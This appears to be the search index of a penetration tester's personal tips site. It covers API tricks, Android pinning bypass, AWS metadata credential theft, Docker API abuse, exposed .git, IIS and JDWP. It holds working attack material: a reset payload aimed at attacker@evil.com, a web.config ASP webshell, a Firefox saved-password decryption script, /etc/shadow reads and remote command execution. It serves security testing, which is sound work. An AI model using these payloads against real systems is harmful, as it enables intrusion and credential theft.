{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Security Tips This is a collection of security tips that I use during my penetration tests. Search By string There is a search bar of the left! By ports Search a tips from a port on the following page: ports","title":"Home"},{"location":"#security-tips","text":"This is a collection of security tips that I use during my penetration tests.","title":"Security Tips"},{"location":"#search","text":"","title":"Search"},{"location":"#by-string","text":"There is a search bar of the left!","title":"By string"},{"location":"#by-ports","text":"Search a tips from a port on the following page: ports","title":"By ports"},{"location":"API/","text":"API Password reset From: https://hackerone.com/reports/322985 The attacker was able to send a password reset link to an arbitrary email by sending an array of email addresses instead of a single email address. POST https://hq.breadcrumb.com/api/v1/password_reset HTTP/1.1 with body like {\"email_address\":[\"admin@breadcrumb.com\",\"attacker@evil.com\"]} JSON to XML to XXE When the API accept JSON type format payload, then you can try to send the same payload but as a XML file. You can download the Burp extension named \"Content Type Converter\". This extension helps you to modify the JSON request to XML, XML request to JSON and normal form request to JSON in order to play with request and responses. https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html PUT /api/search HTTP/1.1 Host: test.com ... Content-Type: application/json;charset=UTF-8 { \"message\": \"xxx\" } PUT /api/message HTTP/1.1 Host: test.com ... Content-Type: application/xml;charset=UTF-8 <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?> <message>xxx</message> If the request is accepted by the API, then you can try to attack with an XXE payload. Exploit application routing @samwcyo explains how to exploit some mis-configuration on web routing . That's mean a server may internally call an other resource based on the user URL. The rewriting can be modify using techniques such as Directory traversal ( ../ ) or add Control characters (%23 (#), %3f (?), %26 (&), %2e (.), %2f (/), %40 (@)) with double or triple encoding in the URL. He shows some real examples where he can raise an exception on the internal application using some encoding on control characters: GET /files/lol.png%23 HTTP/1.1 GET /files/..%2f%23 HTTP/1.1","title":"API"},{"location":"API/#api","text":"","title":"API"},{"location":"API/#password-reset","text":"From: https://hackerone.com/reports/322985 The attacker was able to send a password reset link to an arbitrary email by sending an array of email addresses instead of a single email address. POST https://hq.breadcrumb.com/api/v1/password_reset HTTP/1.1 with body like {\"email_address\":[\"admin@breadcrumb.com\",\"attacker@evil.com\"]}","title":"Password reset"},{"location":"API/#json-to-xml-to-xxe","text":"When the API accept JSON type format payload, then you can try to send the same payload but as a XML file. You can download the Burp extension named \"Content Type Converter\". This extension helps you to modify the JSON request to XML, XML request to JSON and normal form request to JSON in order to play with request and responses. https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html PUT /api/search HTTP/1.1 Host: test.com ... Content-Type: application/json;charset=UTF-8 { \"message\": \"xxx\" } PUT /api/message HTTP/1.1 Host: test.com ... Content-Type: application/xml;charset=UTF-8 <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?> <message>xxx</message> If the request is accepted by the API, then you can try to attack with an XXE payload.","title":"JSON to XML to XXE"},{"location":"API/#exploit-application-routing","text":"@samwcyo explains how to exploit some mis-configuration on web routing . That's mean a server may internally call an other resource based on the user URL. The rewriting can be modify using techniques such as Directory traversal ( ../ ) or add Control characters (%23 (#), %3f (?), %26 (&), %2e (.), %2f (/), %40 (@)) with double or triple encoding in the URL. He shows some real examples where he can raise an exception on the internal application using some encoding on control characters: GET /files/lol.png%23 HTTP/1.1 GET /files/..%2f%23 HTTP/1.1","title":"Exploit application routing"},{"location":"android/","text":"Android Installation Download GenyMotion and install it. It's free for a personal use. Create a new VM, I personally use a Custom Tablet 8.0 with API 26. It's about 300Mo to download. Then, you need to install the GApps. Click on the top right button \"Open Gapps\". Connect with ADB GenyMotion has it's own adb , but you can still use your own version. On Windows, it's located here: C:\\Program Files\\Genymobile\\Genymotion\\tools . cd \"C:\\Program Files\\Genymobile\\Genymotion\\tools\" adb.exe devices adb.exe connect <device ip> adb.exe shell vbox86p:/ # Certificate Pinning On Android 7+, you need to install the burp AC on the system store. Technical details are explain here . Then, on the application you may need to patch some instructions. You will need some Android tools and patch the smali code. One again, technical details are explained here . OkHTTP3 The framework allows the developers to set SHA1 or SHA256 certificate signature to handle certificate pinning. Therefore, the easiest way to bypass the pinning is to change the framework logic. The logic is located inside the file CertificatePinner.kt (or CertificatePinner.java for old versions). for (peerCertificate in peerCertificates) { // Lazily compute the hashes for each certificate. var sha1: ByteString? = null var sha256: ByteString? = null for (pin in pins) { when (pin.hashAlgorithm) { \"sha256/\" -> { if (sha256 == null) sha256 = peerCertificate.toSha256ByteString() if (pin.hash == sha256) return // Success! } \"sha1/\" -> { if (sha1 == null) sha1 = peerCertificate.toSha1ByteString() if (pin.hash == sha1) return // Success! } else -> throw AssertionError(\"unsupported hashAlgorithm: ${pin.hashAlgorithm}\") } } } We should not throw an exception. This is straightforward, let's change the conditions pin.hash == sha256 and pin.hash == sha1 . TO do this, we need to edit the smali code. By the way, I find quite handy to use jadx to match smali to Java code. The smali code for the check is the following : .line 180 :cond_2 iget-object v9, v9, Lokhttp3/CertificatePinner$Pin;->hash:Lokio/ByteString; invoke-virtual {v9, v7}, Lokio/ByteString;->equals(Ljava/lang/Object;)Z move-result v9 **if-eqz** v9, :cond_5 At the end, we need to inverse the condition from if-eqz ( if equal zero ) to if-nez ( if non-zero ). There is a list of all opcode here . Don't forget to check your code is correct to jadx : if (!pin.hash.equals(byteString)) { return; } Add Burp AC Export the certificate with DER format. Then use openssl to convert to PEM format and get the hash: openssl x509 -inform DER -in cacert.der -out cacert.pem openssl x509 -inform PEM -subject_hash_old -in cacert.pem |head -1 mv cacert.pem <hash>.0 Once you have the file with the correct name, push it to the phone using adb : adb root adb remount adb push <cert>.0 /sdcard/ adb shell On the phone, move the file to the cert store and fix the permissions: mv /sdcard/<cert>.0 /system/etc/security/cacerts/ chmod 644 /system/etc/security/cacerts/<cert>.0 Then you need to reboot the device ( adb reboot ). After the device reboots, check if everything is fine in Settings / Security / Trusted Credentials . You should show a new \"Portswigger CA\" as a system trusted CA. Edit Android APK Edit an APK file using apktool apktool d example/ -o example.unaligned.apk Then when you finished to edit the files (smali, AndroidManifest, ...) you can recompile and sign the new apk file. apktool b example/ -o example.unaligned.apk jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore ~/.android/debug.keystore -storepass android example.unaligned.apk androiddebugkey zipalign -v 4 example.unaligned.apk example.smali.apk ADB List packages adb shell pm list packages Get APK from Android device adb shell pm path com.example.someapp adb pull <apk_path> <path_on_your_disk> Install application adb shell settings put global verifier_verify_adb_installs 0 # adb shell settings put global package_verifier_enable 0 adb install <app.apk>","title":"Android"},{"location":"android/#android","text":"","title":"Android"},{"location":"android/#installation","text":"Download GenyMotion and install it. It's free for a personal use. Create a new VM, I personally use a Custom Tablet 8.0 with API 26. It's about 300Mo to download. Then, you need to install the GApps. Click on the top right button \"Open Gapps\".","title":"Installation"},{"location":"android/#connect-with-adb","text":"GenyMotion has it's own adb , but you can still use your own version. On Windows, it's located here: C:\\Program Files\\Genymobile\\Genymotion\\tools . cd \"C:\\Program Files\\Genymobile\\Genymotion\\tools\" adb.exe devices adb.exe connect <device ip> adb.exe shell vbox86p:/ #","title":"Connect with ADB"},{"location":"android/#certificate-pinning","text":"On Android 7+, you need to install the burp AC on the system store. Technical details are explain here . Then, on the application you may need to patch some instructions. You will need some Android tools and patch the smali code. One again, technical details are explained here .","title":"Certificate Pinning"},{"location":"android/#okhttp3","text":"The framework allows the developers to set SHA1 or SHA256 certificate signature to handle certificate pinning. Therefore, the easiest way to bypass the pinning is to change the framework logic. The logic is located inside the file CertificatePinner.kt (or CertificatePinner.java for old versions). for (peerCertificate in peerCertificates) { // Lazily compute the hashes for each certificate. var sha1: ByteString? = null var sha256: ByteString? = null for (pin in pins) { when (pin.hashAlgorithm) { \"sha256/\" -> { if (sha256 == null) sha256 = peerCertificate.toSha256ByteString() if (pin.hash == sha256) return // Success! } \"sha1/\" -> { if (sha1 == null) sha1 = peerCertificate.toSha1ByteString() if (pin.hash == sha1) return // Success! } else -> throw AssertionError(\"unsupported hashAlgorithm: ${pin.hashAlgorithm}\") } } } We should not throw an exception. This is straightforward, let's change the conditions pin.hash == sha256 and pin.hash == sha1 . TO do this, we need to edit the smali code. By the way, I find quite handy to use jadx to match smali to Java code. The smali code for the check is the following : .line 180 :cond_2 iget-object v9, v9, Lokhttp3/CertificatePinner$Pin;->hash:Lokio/ByteString; invoke-virtual {v9, v7}, Lokio/ByteString;->equals(Ljava/lang/Object;)Z move-result v9 **if-eqz** v9, :cond_5 At the end, we need to inverse the condition from if-eqz ( if equal zero ) to if-nez ( if non-zero ). There is a list of all opcode here . Don't forget to check your code is correct to jadx : if (!pin.hash.equals(byteString)) { return; }","title":"OkHTTP3"},{"location":"android/#add-burp-ac","text":"Export the certificate with DER format. Then use openssl to convert to PEM format and get the hash: openssl x509 -inform DER -in cacert.der -out cacert.pem openssl x509 -inform PEM -subject_hash_old -in cacert.pem |head -1 mv cacert.pem <hash>.0 Once you have the file with the correct name, push it to the phone using adb : adb root adb remount adb push <cert>.0 /sdcard/ adb shell On the phone, move the file to the cert store and fix the permissions: mv /sdcard/<cert>.0 /system/etc/security/cacerts/ chmod 644 /system/etc/security/cacerts/<cert>.0 Then you need to reboot the device ( adb reboot ). After the device reboots, check if everything is fine in Settings / Security / Trusted Credentials . You should show a new \"Portswigger CA\" as a system trusted CA.","title":"Add Burp AC"},{"location":"android/#edit-android-apk","text":"","title":"Edit Android APK"},{"location":"android/#edit-an-apk-file-using-apktool","text":"apktool d example/ -o example.unaligned.apk Then when you finished to edit the files (smali, AndroidManifest, ...) you can recompile and sign the new apk file. apktool b example/ -o example.unaligned.apk jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore ~/.android/debug.keystore -storepass android example.unaligned.apk androiddebugkey zipalign -v 4 example.unaligned.apk example.smali.apk","title":"Edit an APK file using apktool"},{"location":"android/#adb","text":"","title":"ADB"},{"location":"android/#list-packages","text":"adb shell pm list packages","title":"List packages"},{"location":"android/#get-apk-from-android-device","text":"adb shell pm path com.example.someapp adb pull <apk_path> <path_on_your_disk>","title":"Get APK from Android device"},{"location":"android/#install-application","text":"adb shell settings put global verifier_verify_adb_installs 0 # adb shell settings put global package_verifier_enable 0 adb install <app.apk>","title":"Install application"},{"location":"aws/","text":"AWS Check if domain is on a bucket $ dig +nocmd flaws.cloud any +multiline +noall +answer List a bucket $ aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2 Ressources http://flaws.cloud/ SSRF on AWS to get credentials On AWS there is a metadata server that can be accessed through the REST API located at: http://169.254.169.254 . Sending a GET requests to the following endpoint will dump a list of roles that are attaches to the current EC2 instance. http://169.254.169.254/latest/meta-data/iam/security-credentials/ http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>","title":"AWS"},{"location":"aws/#aws","text":"","title":"AWS"},{"location":"aws/#check-if-domain-is-on-a-bucket","text":"$ dig +nocmd flaws.cloud any +multiline +noall +answer","title":"Check if domain is on a bucket"},{"location":"aws/#list-a-bucket","text":"$ aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2","title":"List a bucket"},{"location":"aws/#ressources","text":"http://flaws.cloud/","title":"Ressources"},{"location":"aws/#ssrf-on-aws-to-get-credentials","text":"On AWS there is a metadata server that can be accessed through the REST API located at: http://169.254.169.254 . Sending a GET requests to the following endpoint will dump a list of roles that are attaches to the current EC2 instance. http://169.254.169.254/latest/meta-data/iam/security-credentials/ http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>","title":"SSRF on AWS to get credentials"},{"location":"configuration-review/","text":"Switch Switch Hirschmann Un switch Hirschmann est un \u00e9quipement r\u00e9seau industriel. Pour r\u00e9cup\u00e9rer sa configuration, il est possible d'utiliser le logiciel HiVision. Le fichier de configuration est un fichier texte au format XML contenant un noeud chiffr\u00e9e. Depuis l'interface il est possible de le d\u00e9chiffrer. Pare-feu Fortinet Il est possible de se connecter sur une interface Web. Pour r\u00e9cup\u00e9rer la configuration du pare-feu il convient de t\u00e9l\u00e9charger une sauvegarde de la configuration.","title":"Switch"},{"location":"configuration-review/#switch","text":"","title":"Switch"},{"location":"configuration-review/#switch-hirschmann","text":"Un switch Hirschmann est un \u00e9quipement r\u00e9seau industriel. Pour r\u00e9cup\u00e9rer sa configuration, il est possible d'utiliser le logiciel HiVision. Le fichier de configuration est un fichier texte au format XML contenant un noeud chiffr\u00e9e. Depuis l'interface il est possible de le d\u00e9chiffrer.","title":"Switch Hirschmann"},{"location":"configuration-review/#pare-feu","text":"","title":"Pare-feu"},{"location":"configuration-review/#fortinet","text":"Il est possible de se connecter sur une interface Web. Pour r\u00e9cup\u00e9rer la configuration du pare-feu il convient de t\u00e9l\u00e9charger une sauvegarde de la configuration.","title":"Fortinet"},{"location":"docker/","text":"Docker API The docker API expose the port 2375 . This API can be used to interact with the docker engine which basically give ou the right to do anything you desire unauthenticated. To confirm that the host is running Docker you can make a GET requests to /version : http://<host>:<port>/version {\"Platform\": {\"Name\": \"\"}, \"Components\": [{\"Name\": \"Engine\", \"Version\": \"18.06.1-ce\", \"Details\": {\"ApiVersion\": \"1.38\", \"Arch\": \"amd64\", \"BuildTime\": \"2018-10-26T23:39:57.000000000+00:00\", \"Experimental\": \"false\", \"GitCommit\": \"e68fc7a/18.06.1-ce\", \"GoVersion\": \"go1.10.3\", \"KernelVersion\": \"4.14.47-64.38.amzn2.x86_64\", \"MinAPIVersion\": \"1.12\", \"Os\": \"linux\"}}], \"Version\": \"18.06.1-ce\", \"ApiVersion\": \"1.38\", \"MinAPIVersion\": \"1.12\", \"GitCommit\": \"e68fc7a/18.06.1-ce\", \"GoVersion\": \"go1.10.3\", \"Os\": \"linux\", \"Arch\": \"amd64\", \"KernelVersion\": \"4.14.47-64.38.amzn2.x86_64\", \"BuildTime\": \"2018-10-26T23:39:57.000000000+00:00\"} Then, using the CLI you can execute commands, for instance: $ docker -H <host>:<port> ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES be2dd8aa8222 ubuntu:14.04 \"bash\" 5 years ago Up 2 seconds silly_elion $ docker -H <host>:<port> exec -it <container_name> /bin/bash root@abc:/# whoami root Privilege Escalation If the current user belong to the docker group then he can start a container with a binding to files own by root and read them: docker run --it --rm -v /:/mnt alpine:latest /mnt sh Inside the container shell he can read all the files as root: cat /etc/shadow","title":"Docker"},{"location":"docker/#docker","text":"","title":"Docker"},{"location":"docker/#api","text":"The docker API expose the port 2375 . This API can be used to interact with the docker engine which basically give ou the right to do anything you desire unauthenticated. To confirm that the host is running Docker you can make a GET requests to /version : http://<host>:<port>/version {\"Platform\": {\"Name\": \"\"}, \"Components\": [{\"Name\": \"Engine\", \"Version\": \"18.06.1-ce\", \"Details\": {\"ApiVersion\": \"1.38\", \"Arch\": \"amd64\", \"BuildTime\": \"2018-10-26T23:39:57.000000000+00:00\", \"Experimental\": \"false\", \"GitCommit\": \"e68fc7a/18.06.1-ce\", \"GoVersion\": \"go1.10.3\", \"KernelVersion\": \"4.14.47-64.38.amzn2.x86_64\", \"MinAPIVersion\": \"1.12\", \"Os\": \"linux\"}}], \"Version\": \"18.06.1-ce\", \"ApiVersion\": \"1.38\", \"MinAPIVersion\": \"1.12\", \"GitCommit\": \"e68fc7a/18.06.1-ce\", \"GoVersion\": \"go1.10.3\", \"Os\": \"linux\", \"Arch\": \"amd64\", \"KernelVersion\": \"4.14.47-64.38.amzn2.x86_64\", \"BuildTime\": \"2018-10-26T23:39:57.000000000+00:00\"} Then, using the CLI you can execute commands, for instance: $ docker -H <host>:<port> ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES be2dd8aa8222 ubuntu:14.04 \"bash\" 5 years ago Up 2 seconds silly_elion $ docker -H <host>:<port> exec -it <container_name> /bin/bash root@abc:/# whoami root","title":"API"},{"location":"docker/#privilege-escalation","text":"If the current user belong to the docker group then he can start a container with a binding to files own by root and read them: docker run --it --rm -v /:/mnt alpine:latest /mnt sh Inside the container shell he can read all the files as root: cat /etc/shadow","title":"Privilege Escalation"},{"location":"firefox/","text":"Firefox Useful addons Here are good Firefox addons to install: Firefox Multi-Account Containers FoxyProxy Standard Wappalyzer HackBar User-Agent Switcher and Manager Tamper Data for FF Quantum Read password (old) import os from ctypes import Structure, CDLL from ctypes import c_uint, c_void_p, c_char_p, cast, byref, string_at, c_ubyte import json import base64 NSSNAME = 'nss3.dll' FIREFOX_PATH = r'C:\\Program Files\\Mozilla Firefox' os.environ['PATH'] = \";\".join([os.environ['PATH'], FIREFOX_PATH]) class SECItem(Structure): _fields_ = [('type', c_uint), ('data', c_void_p), ('len', c_uint)] class secuPWData(Structure): _fields_ = [('source', c_ubyte), ('data', c_char_p)] def get_nss_lib(): nsslib = os.path.join(FIREFOX_PATH, NSSNAME) return CDLL(nsslib) def open_logins_file(folder): with open(os.path.join(folder, 'logins.json')) as fd: d = fd.read() j = json.loads(d) return j def read_password(folder): data = open_logins_file(folder) nsslib = get_nss_lib() logins = data.get('logins', []) ret_init = nsslib.NSS_Init(folder) print \"[+] Init NSS: %s\" % ret_init keySlot = nsslib.PK11_GetInternalKeySlot() nsslib.PK11_CheckUserPassword(keySlot, '') nsslib.PK11_Authenticate(keySlot, True, 0) field = SECItem() dectext = SECItem() pwdata = secuPWData() pwdata.source = 0 #PW_NONE pwdata.data = 0 d = logins[0]['encryptedPassword'] print d field.data = cast(c_char_p(base64.b64decode(d)), c_void_p) field.len = len(base64.b64decode(d)) print nsslib.PK11SDR_Decrypt(byref(field), byref(dectext), byref(pwdata)) print string_at(dectext.data, dectext.len) nsslib.NSS_Shutdown() if __name__ == '__main__': d = r'C:\\Users\\xxx\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\xxx' read_password(d)","title":"Firefox"},{"location":"firefox/#firefox","text":"","title":"Firefox"},{"location":"firefox/#useful-addons","text":"Here are good Firefox addons to install: Firefox Multi-Account Containers FoxyProxy Standard Wappalyzer HackBar User-Agent Switcher and Manager Tamper Data for FF Quantum","title":"Useful addons"},{"location":"firefox/#read-password-old","text":"import os from ctypes import Structure, CDLL from ctypes import c_uint, c_void_p, c_char_p, cast, byref, string_at, c_ubyte import json import base64 NSSNAME = 'nss3.dll' FIREFOX_PATH = r'C:\\Program Files\\Mozilla Firefox' os.environ['PATH'] = \";\".join([os.environ['PATH'], FIREFOX_PATH]) class SECItem(Structure): _fields_ = [('type', c_uint), ('data', c_void_p), ('len', c_uint)] class secuPWData(Structure): _fields_ = [('source', c_ubyte), ('data', c_char_p)] def get_nss_lib(): nsslib = os.path.join(FIREFOX_PATH, NSSNAME) return CDLL(nsslib) def open_logins_file(folder): with open(os.path.join(folder, 'logins.json')) as fd: d = fd.read() j = json.loads(d) return j def read_password(folder): data = open_logins_file(folder) nsslib = get_nss_lib() logins = data.get('logins', []) ret_init = nsslib.NSS_Init(folder) print \"[+] Init NSS: %s\" % ret_init keySlot = nsslib.PK11_GetInternalKeySlot() nsslib.PK11_CheckUserPassword(keySlot, '') nsslib.PK11_Authenticate(keySlot, True, 0) field = SECItem() dectext = SECItem() pwdata = secuPWData() pwdata.source = 0 #PW_NONE pwdata.data = 0 d = logins[0]['encryptedPassword'] print d field.data = cast(c_char_p(base64.b64decode(d)), c_void_p) field.len = len(base64.b64decode(d)) print nsslib.PK11SDR_Decrypt(byref(field), byref(dectext), byref(pwdata)) print string_at(dectext.data, dectext.len) nsslib.NSS_Shutdown() if __name__ == '__main__': d = r'C:\\Users\\xxx\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\xxx' read_password(d)","title":"Read password (old)"},{"location":"ftp/","text":"FTP The File Transfert Protocole ( FTP ) is a network protocol used for the transfer of files between a client and a server. This service is commonly exposed on port 21 . Anonymous login Some FTP server allow anonymous authentication, that means a user can login with the anonymous username and no passwords. You can check if the server supports this features with multiple tools: with a nmap script: nmap --script=ftp-anon -p{PORT} {HOST} with a browser: type the following URL ftp://{HOST}:{PORT} manually with netcat or telnet : telnet {HOST} {PORT} SFTP port forwarding SFTP runs as a subsystem of SSH . As with SSH , it's possible to test for port forwarding if there is a bad configuration on the SSH server.","title":"FTP"},{"location":"ftp/#ftp","text":"The File Transfert Protocole ( FTP ) is a network protocol used for the transfer of files between a client and a server. This service is commonly exposed on port 21 .","title":"FTP"},{"location":"ftp/#anonymous-login","text":"Some FTP server allow anonymous authentication, that means a user can login with the anonymous username and no passwords. You can check if the server supports this features with multiple tools: with a nmap script: nmap --script=ftp-anon -p{PORT} {HOST} with a browser: type the following URL ftp://{HOST}:{PORT} manually with netcat or telnet : telnet {HOST} {PORT}","title":"Anonymous login"},{"location":"ftp/#sftp-port-forwarding","text":"SFTP runs as a subsystem of SSH . As with SSH , it's possible to test for port forwarding if there is a bad configuration on the SSH server.","title":"SFTP port forwarding"},{"location":"git/","text":"Git Exploit git exposed over HTTP Some website exposes .git to the Internet. To check if the website is vulnerable, then check for the following path: https://<domain>/some/path/.git/HEAD If the server return a status 200, then it might be possible to clone the repository. For that, you can use GitTools : Dumper/gitdumper.sh http://<domain>/some/path/.git/ ~/<domain> Extractor/extractor.sh ~/<domain> ~/<domain>_dump If the script is not dumping the .git folder, then you can modify it. Sometimes, the /.git/ path is a Directory Listing, then it's easier to dump using wget . Find git secrets Here is 2 tools I used to find git secrets: GitLeaks truffleHog Or you can use the git command: git log git diff <commit_hash> Don't forget to also check the username or email address of the committers. Use git over an HTTP Proxy You can use git (therefore ssh ) over an HTTP Proxy using the ProxyCommand configuration. For ssh the command looks like: ssh <ssh_user>@<ssh_host> -o \"ProxyCommand=nc -X connect -x <proxy_host>:<proxy_port> %h %p\" Or you can edit the ~/.ssh/config file to add the ProxyCommand to a specific host. For example, if you want to use Github through an HTTP proxy: Host github.com User git ProxyCommand nc -X connect -x <proxy_host>:<proxy_port> %h %p ServerAliveInterval 10","title":"Git"},{"location":"git/#git","text":"","title":"Git"},{"location":"git/#exploit-git-exposed-over-http","text":"Some website exposes .git to the Internet. To check if the website is vulnerable, then check for the following path: https://<domain>/some/path/.git/HEAD If the server return a status 200, then it might be possible to clone the repository. For that, you can use GitTools : Dumper/gitdumper.sh http://<domain>/some/path/.git/ ~/<domain> Extractor/extractor.sh ~/<domain> ~/<domain>_dump If the script is not dumping the .git folder, then you can modify it. Sometimes, the /.git/ path is a Directory Listing, then it's easier to dump using wget .","title":"Exploit git exposed over HTTP"},{"location":"git/#find-git-secrets","text":"Here is 2 tools I used to find git secrets: GitLeaks truffleHog Or you can use the git command: git log git diff <commit_hash> Don't forget to also check the username or email address of the committers.","title":"Find git secrets"},{"location":"git/#use-git-over-an-http-proxy","text":"You can use git (therefore ssh ) over an HTTP Proxy using the ProxyCommand configuration. For ssh the command looks like: ssh <ssh_user>@<ssh_host> -o \"ProxyCommand=nc -X connect -x <proxy_host>:<proxy_port> %h %p\" Or you can edit the ~/.ssh/config file to add the ProxyCommand to a specific host. For example, if you want to use Github through an HTTP proxy: Host github.com User git ProxyCommand nc -X connect -x <proxy_host>:<proxy_port> %h %p ServerAliveInterval 10","title":"Use git over an HTTP Proxy"},{"location":"graphql/","text":"GraphQL Request useful informations Introspection is explained here . First we need to collect all available types then recursively enumerate all individual types. inql can be use to fetch graphql metadata on an endpoint. inql -t https://<host>/graphql Querying All Available Types in a Schema query allSchemaTypes { __schema { types { name kind description } } } All Available Queries query availableQueries { __schema { queryType { fields { name description } } } } Details about an Individual Type query liftType { __type(name: \"<TYPE>\") { fields { name description } } }","title":"GraphQL"},{"location":"graphql/#graphql","text":"","title":"GraphQL"},{"location":"graphql/#request-useful-informations","text":"Introspection is explained here . First we need to collect all available types then recursively enumerate all individual types. inql can be use to fetch graphql metadata on an endpoint. inql -t https://<host>/graphql","title":"Request useful informations"},{"location":"graphql/#querying-all-available-types-in-a-schema","text":"query allSchemaTypes { __schema { types { name kind description } } }","title":"Querying All Available Types in a Schema"},{"location":"graphql/#all-available-queries","text":"query availableQueries { __schema { queryType { fields { name description } } } }","title":"All Available Queries"},{"location":"graphql/#details-about-an-individual-type","text":"query liftType { __type(name: \"<TYPE>\") { fields { name description } } }","title":"Details about an Individual Type"},{"location":"iis/","text":"IIS Bypass blacklist upload It's possible to bypass blacklist upload while uploading a web.config file. For this, you need to set execution rights to .config and then adding ASP code in the web.config . <?xml version=\"1.0\" encoding=\"UTF-8\"?> <configuration> <system.webServer> <handlers accessPolicy=\"Read, Script, Write\"> <add name=\"web_config\" path=\"*.config\" verb=\"*\" modules=\"IsapiModule\" scriptProcessor=\"%windir%\\system32\\inetsrv\\asp.dll\" resourceType=\"Unspecified\" requireAccess=\"Write\" preCondition=\"bitness64\" /> </handlers> <security> <requestFiltering> <fileExtensions> <remove fileExtension=\".config\" /> </fileExtensions> <hiddenSegments> <remove segment=\"web.config\" /> </hiddenSegments> </requestFiltering> </security> </system.webServer> <appSettings> </appSettings> </configuration> <!\u2013- <% Response.write(\"-\"&\"->\") Response.write(\"<pre>\") Set wShell1 = CreateObject(\"WScript.Shell\") Set cmd1 = wShell1.Exec(\"whoami\") output1 = cmd1.StdOut.Readall() set cmd1 = nothing: Set wShell1 = nothing Response.write(output1) Response.write(\"</pre><!-\"&\"-\") %> -\u2013> Upload XAMLX file to get RCE NCCGroup describes how to upload a XAMLX file to execute code on a remote IIS server. Tracing Tracing might be activate on the server. For example, check /trace.axd .","title":"IIS"},{"location":"iis/#iis","text":"","title":"IIS"},{"location":"iis/#bypass-blacklist-upload","text":"It's possible to bypass blacklist upload while uploading a web.config file. For this, you need to set execution rights to .config and then adding ASP code in the web.config . <?xml version=\"1.0\" encoding=\"UTF-8\"?> <configuration> <system.webServer> <handlers accessPolicy=\"Read, Script, Write\"> <add name=\"web_config\" path=\"*.config\" verb=\"*\" modules=\"IsapiModule\" scriptProcessor=\"%windir%\\system32\\inetsrv\\asp.dll\" resourceType=\"Unspecified\" requireAccess=\"Write\" preCondition=\"bitness64\" /> </handlers> <security> <requestFiltering> <fileExtensions> <remove fileExtension=\".config\" /> </fileExtensions> <hiddenSegments> <remove segment=\"web.config\" /> </hiddenSegments> </requestFiltering> </security> </system.webServer> <appSettings> </appSettings> </configuration> <!\u2013- <% Response.write(\"-\"&\"->\") Response.write(\"<pre>\") Set wShell1 = CreateObject(\"WScript.Shell\") Set cmd1 = wShell1.Exec(\"whoami\") output1 = cmd1.StdOut.Readall() set cmd1 = nothing: Set wShell1 = nothing Response.write(output1) Response.write(\"</pre><!-\"&\"-\") %> -\u2013>","title":"Bypass blacklist upload"},{"location":"iis/#upload-xamlx-file-to-get-rce","text":"NCCGroup describes how to upload a XAMLX file to execute code on a remote IIS server.","title":"Upload XAMLX file to get RCE"},{"location":"iis/#tracing","text":"Tracing might be activate on the server. For example, check /trace.axd .","title":"Tracing"},{"location":"iscsi/","text":"ISCSI $ ISCSI_TARGET_PORTAL=172.17.247.210 $ sudo iscsiadm -m discovery -t st -p \"${ISCSI_TARGET_PORTAL}\" $ ISCSI_TARGET_NAME=iqn.1992-04.com.emc:cx.ckm00142002019.b4 $ sudo iscsiadm --mode node --targetname \"${ISCSI_TARGET_NAME}\" -p \"${ISCSI_TARGET_PORTAL}\" -l $ dmesg | grep sd","title":"ISCSI"},{"location":"iscsi/#iscsi","text":"$ ISCSI_TARGET_PORTAL=172.17.247.210 $ sudo iscsiadm -m discovery -t st -p \"${ISCSI_TARGET_PORTAL}\" $ ISCSI_TARGET_NAME=iqn.1992-04.com.emc:cx.ckm00142002019.b4 $ sudo iscsiadm --mode node --targetname \"${ISCSI_TARGET_NAME}\" -p \"${ISCSI_TARGET_PORTAL}\" -l $ dmesg | grep sd","title":"ISCSI"},{"location":"jdwp/","text":"Java Debug Wire Protocol (JDWP) JWDP is the protocol used for communication between a debugger and a Java app (JVM). Manual exploitation It's possible to execute shell commands using jdb : jdb -attach 8000 Then you need to find a good java thread to stop in and execute you command. It appears that the method indexOf of the String class is a good candidate: trace go methods # wait that the jdb dies stop in java.lang.String().indexOf(int) print new java.lang.Runtime().exec(\"<cmd>\") This should execute you command with the privilege of the Java application. But be careful, the manual method often fails. jdwp-shellifier jdwp-shellifier is an exploitation tool to exploit JWDP . It's available on github . Again we use the indexOf method to break on, it's possible to use an other one. git clone https://github.com/IOActive/jdwp-shellifier cd jdwp-shellifier python jdwp-shellifier.py -t <ip> - p <port> --break-on \"java.lang.String.indexOf\" --cmd \"<cmd>\"","title":"JDWP"},{"location":"jdwp/#java-debug-wire-protocol-jdwp","text":"JWDP is the protocol used for communication between a debugger and a Java app (JVM).","title":"Java Debug Wire Protocol (JDWP)"},{"location":"jdwp/#manual-exploitation","text":"It's possible to execute shell commands using jdb : jdb -attach 8000 Then you need to find a good java thread to stop in and execute you command. It appears that the method indexOf of the String class is a good candidate: trace go methods # wait that the jdb dies stop in java.lang.String().indexOf(int) print new java.lang.Runtime().exec(\"<cmd>\") This should execute you command with the privilege of the Java application. But be careful, the manual method often fails.","title":"Manual exploitation"},{"location":"jdwp/#jdwp-shellifier","text":"jdwp-shellifier is an exploitation tool to exploit JWDP . It's available on github . Again we use the indexOf method to break on, it's possible to use an other one. git clone https://github.com/IOActive/jdwp-shellifier cd jdwp-shellifier python jdwp-shellifier.py -t <ip> - p <port> --break-on \"java.lang.String.indexOf\" --cmd \"<cmd>\"","title":"jdwp-shellifier"},{"location":"jwt/","text":"JSON Web Token Finding Public Keys Some common locations for public keys are: /api/keys /api/v1/keys /.well-known/jwks.json /openid/connect/jwks.json /jwks.json Vulnerabilities There is know vulnerabilities on JWT: CVE-2015-2951 : The alg=none signature-bypass vulnerability in JWT.php CVE-2016-10555 : The RS/HS256 public key mismatch vulnerability because the server does not enforce \"algorithm\" CVE-2018-0114 : It's possible to re-sign a token using a key that is embedded within the token JWT Toolkit jwt_tool.py is a toolkit for validating, forging and cracking JWTs (JSON Web 